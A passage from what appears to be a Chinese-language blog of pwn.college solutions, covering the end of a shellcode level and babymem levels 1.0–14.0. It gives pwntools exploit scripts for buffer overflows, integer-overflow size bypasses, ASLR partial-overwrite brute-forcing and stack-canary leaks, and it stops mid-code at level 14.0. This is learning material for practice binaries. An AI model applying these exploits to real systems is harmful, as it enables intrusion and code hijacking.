</span></span></code></pre></td></tr></table></div></div><h3 id=14-2>14</h3><p>只能读 6 字节。注意到 rax 原本就是 0，可以省略对其的初始化；gdb 中能看到 rdx 中原本存储了 shellcode 的地址，因此我们可以直接写入这个地址；rsi 中原本存储了一个较大的数字，我们可以直接用来作为 <code>read</code> 的第三个参数。综上，要做的只有给 rdi 赋值 0、将 rdx 的值赋值给 rsi、调用 syscall 三件事，每件事都可以压缩到 2 个字节。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># read(0, address of shellcode, some big number)</span>
</span></span><span class=line><span class=cl><span class=n>sc1</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>xor edi, edi
</span></span></span><span class=line><span class=cl><span class=s2>push rdx
</span></span></span><span class=line><span class=cl><span class=s2>pop rsi
</span></span></span><span class=line><span class=cl><span class=s2>syscall
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=c1># orw</span>
</span></span><span class=line><span class=cl><span class=n>sc2</span> <span class=o>=</span> <span class=n>shellcraft</span><span class=o>.</span><span class=n>readfile</span><span class=p>(</span><span class=s2>&#34;/flag&#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=n>sc1</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>nop</span><span class=o>*</span><span class=mi>16</span> <span class=o>+</span> <span class=n>asm</span><span class=p>(</span><span class=n>sc2</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=babymem-memory-errors>babymem: Memory Errors</h2><p>模版：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sa</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>delim</span><span class=p>,</span><span class=n>data</span><span class=p>:</span> <span class=n>p</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=n>delim</span><span class=p>,</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>delim</span><span class=p>,</span><span class=n>data</span><span class=p>:</span> <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=n>delim</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>data</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>num</span><span class=o>=</span><span class=mi>4096</span><span class=p>:</span> <span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=n>num</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>delims</span><span class=p>,</span><span class=n>drop</span><span class=o>=</span><span class=kc>True</span><span class=p>:</span> <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=n>delims</span><span class=p>,</span><span class=n>drop</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>leak</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>name</span><span class=p>,</span><span class=n>addr</span><span class=p>:</span> <span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s1>&#39;</span><span class=si>{}</span><span class=s1> = </span><span class=si>{:#x}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>name</span><span class=p>,</span> <span class=n>addr</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>s</span><span class=p>(</span><span class=n>pl</span><span class=p>,</span> <span class=n>sz</span><span class=o>=</span><span class=kc>None</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>sz</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>sz</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>pl</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;Payload size: &#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>sz</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>sa</span><span class=p>(</span><span class=s1>&#39;bytes)!</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=n>pl</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>binary</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;/challenge/</span><span class=si>{</span><span class=n>os</span><span class=o>.</span><span class=n>getenv</span><span class=p>(</span><span class=s2>&#34;HOSTNAME&#34;</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>binary</span>
</span></span><span class=line><span class=cl><span class=c1># context.log_level = &#39;DEBUG&#39;</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=n>binary</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>nop</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x90</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=c1># TODO</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=10-2>1.0</h3><p>直接给了偏移量 44，只要溢出 1 字节就能将目标值改成非 0 了。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>44</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x01</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=11-2>1.1</h3><p>没有给偏移量，可以无视偏移量直接输入很长的 payload，因为 canary 检查在 <code>win</code> 执行之后。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x100</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=20-3>2.0</h3><p>和 1.0 类似，只不过在堆上。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>192</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x01</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=21-3>2.1</h3><p>和 1.1 类似，只不过在堆上。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x200</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=30-1>3.0</h3><p>提供了偏移量和目标函数地址，直接覆盖返回地址即可。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>win</span> <span class=o>=</span> <span class=mh>0x401554</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>88</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>win</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=31-1>3.1</h3><p>用 pwndbg 的 <code>cyclic</code> 可以准确确定偏移量，<code>info func</code> 可以得到 <code>win</code> 的地址。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>win</span> <span class=o>=</span> <span class=mh>0x4020e1</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=p>(</span><span class=mi>128</span><span class=o>+</span><span class=mi>8</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>win</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><blockquote><p>注：babymem 后续所有题目的 <code>x.1</code> 均是在 <code>x.0</code> 基础上要求自己确定偏移量和地址，不再赘述。</p></blockquote><h3 id=40-1>4.0</h3><p>对输入长度进行检查，可以用整数溢出绕过，绕过后可能需要多运行几次才能成功，题目也给了提示：</p><blockquote><p>Because the read() call will interpret your size differently than the check above, the resulting read will be unstable and might fail. You will likely have to try this several times before your input is actually read.</p></blockquote><p>这里 <code>size</code> 也可以直接写 <code>-1</code>。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>win</span> <span class=o>=</span> <span class=mh>0x401861</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>88</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>win</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>size</span> <span class=o>=</span> <span class=mh>0xffffffff</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>,</span> <span class=n>size</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=50-1>5.0</h3><p>需要做一次乘法后得到溢出的结果，可以用 2 * 2147483648 得到。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>win</span> <span class=o>=</span> <span class=mh>0x4017eb</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>152</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>win</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>num</span> <span class=o>=</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl><span class=n>size</span> <span class=o>=</span> <span class=mi>2147483648</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;to send: &#39;</span><span class=p>,</span> <span class=n>num</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;record: &#39;</span><span class=p>,</span> <span class=n>size</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sa</span><span class=p>(</span><span class=s1>&#39;bytes)!</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=60>6.0</h3><p>题目给了做法，就是跳到检查语句后面的地址就可以绕过检查。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>win</span> <span class=o>=</span> <span class=mh>0x402177</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>88</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>win</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=70-1>7.0</h3><p>和 6.0 一样需要跳到检查语句后面，IDA 可以看到这个地址是 0x358，区别在于开启了 ASLR 我们只能确定地址的后三位。这里使用的技巧是仅仅覆盖最后两个字节，此时倒数第 4 个 bit 有 1/16 的概率猜对，多运行几次即可。</p><p>本题可以删除模版中的 <code>p=process(binary)</code> 一行。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>win</span> <span class=o>=</span> <span class=mh>0x358</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>72</span><span class=o>+</span><span class=n>p16</span><span class=p>(</span><span class=n>win</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=n>binary</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>res</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>recvall</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=sa>b</span><span class=s1>&#39;pwn.college{&#39;</span> <span class=ow>in</span> <span class=n>res</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>res</span><span class=p>[</span><span class=o>-</span><span class=mi>100</span><span class=p>:])</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=80>8.0</h3><p>在 7.0 的基础上，会用 <code>strlen</code> 检查 <code>buf</code> 长度，直接 0 字节截断即可。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>win</span> <span class=o>=</span> <span class=mh>0x14f</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=o>*</span><span class=mi>8</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>128</span> <span class=o>+</span> <span class=n>p16</span><span class=p>(</span><span class=n>win</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=n>binary</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>res</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>recvall</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=sa>b</span><span class=s1>&#39;pwn.college{&#39;</span> <span class=ow>in</span> <span class=n>res</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>res</span><span class=p>[</span><span class=o>-</span><span class=mi>100</span><span class=p>:])</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=90>9.0</h3><p>本题需要覆盖读计数器，从而跳过 canary 写入返回地址，题目给了读计数器的实现：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>while</span> <span class=p>(</span><span class=n>n</span> <span class=o>&lt;</span> <span class=n>size</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>n</span> <span class=o>+=</span> <span class=n>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>input</span> <span class=o>+</span> <span class=n>n</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>还给了 <code>n</code> 的偏移量 36 和返回地址偏移量 56，因此根据上述实现将 <code>n</code> 覆盖为 55，下一次循环就可以写返回地址的最低字节了。由于要写最低两字节，因此 <code>size</code> 设置为 58 即可，和 payload 长度无关。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>win</span> <span class=o>=</span> <span class=mh>0xc0a</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>36</span><span class=o>+</span><span class=n>p8</span><span class=p>(</span><span class=mi>56</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span><span class=o>+</span><span class=n>p16</span><span class=p>(</span><span class=n>win</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>size</span> <span class=o>=</span> <span class=mi>56</span><span class=o>+</span><span class=mi>2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=n>binary</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>,</span> <span class=n>size</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>res</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>recvall</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=sa>b</span><span class=s1>&#39;pwn.college{&#39;</span> <span class=ow>in</span> <span class=n>res</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>res</span><span class=p>[</span><span class=o>-</span><span class=mi>100</span><span class=p>:])</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=100>10.0</h3><p>flag 在栈上，距离输入 73 字节的地方，小于输入到 rbp 的距离，因此本题不需要溢出，也不用管 canary 和 ASLR，只需要填充 73 个非零字节，最后打印时就会顺带打印出后面的 flag。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>73</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=110>11.0</h3><p>类似 10.0，只不过 mmap 在了堆上。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>4096</span><span class=o>*</span><span class=mi>7</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=120>12.0</h3><p>题目提供了一个后门，使得只要输入中含有 <code>REPEAT</code>，<code>challenge()</code> 就会重新执行。利用这一点以及 canary 最低字节必定为 0 的特性，我们覆盖 canary 最低字节为 <code>0x01</code>，从而使得栈上字符串不被截断，顺带打印出 canary 高 7 字节的值。随后在溢出时只需要注意用正确的值覆盖 canary 即可绕开检测，剩余部分类似 7.0。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>win</span> <span class=o>=</span> <span class=mh>0x751</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=n>binary</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;REPEATaa&#39;</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x10</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x01</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x01</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>canary</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span> <span class=o>+</span> <span class=n>r</span><span class=p>(</span><span class=mi>7</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>leak</span><span class=p>(</span><span class=s1>&#39;canary&#39;</span><span class=p>,</span> <span class=n>canary</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x18</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>canary</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>8</span> <span class=o>+</span> <span class=n>p16</span><span class=p>(</span><span class=n>win</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>res</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>recvall</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=sa>b</span><span class=s1>&#39;pwn.college{&#39;</span> <span class=ow>in</span> <span class=n>res</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>res</span><span class=p>[</span><span class=o>-</span><span class=mi>100</span><span class=p>:])</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=130>13.0</h3><p>类似 10.0。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>172</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=140>14.0</h3><p>本题和 12.0 的区别在于打印函数只会打印 268 个字符，而输入到 canary 相距 272 字节。不过本题比较仁慈，canary 的值在栈上距离更近的位置也有出现，可以 leak 这些位置的值。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
